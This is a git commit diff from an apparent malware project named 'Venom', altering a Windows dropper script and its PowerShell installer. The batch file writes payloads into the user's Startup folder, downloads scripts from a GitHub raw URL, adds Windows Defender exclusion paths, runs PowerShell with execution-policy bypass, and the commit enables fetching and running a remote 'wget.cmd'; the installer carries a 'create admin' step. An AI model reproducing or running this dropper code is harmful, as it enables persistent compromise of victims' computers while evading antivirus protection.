4878252d03a66b190d17029052a899114c90f615
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-01-31 18:32:50 -0900

    altnt test 1

--- Venom/files/installer.ps1
+++ Venom/files/installer.ps1
@@ -5,6 +5,7 @@ function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
+
 #create admin
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
--- Venom/initial.cmd
+++ Venom/initial.cmd
@@ -16,18 +16,18 @@ cd %STARTUP%
 
 @REM write payloads to startup
 
-@REM powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
+powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
 
-powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+@rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
 
-powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
+@rem powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
 
-powershell powershell.exe -ep bypass "./altnt.ps1
+@rem powershell powershell.exe -ep bypass "./altnt.ps1
 
 @REM powershell powershell.exe -ep bypass "./installer.ps1"
 
 @REM run payload
-@REM powershell ./wget.cmd
+powershell ./wget.cmd
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
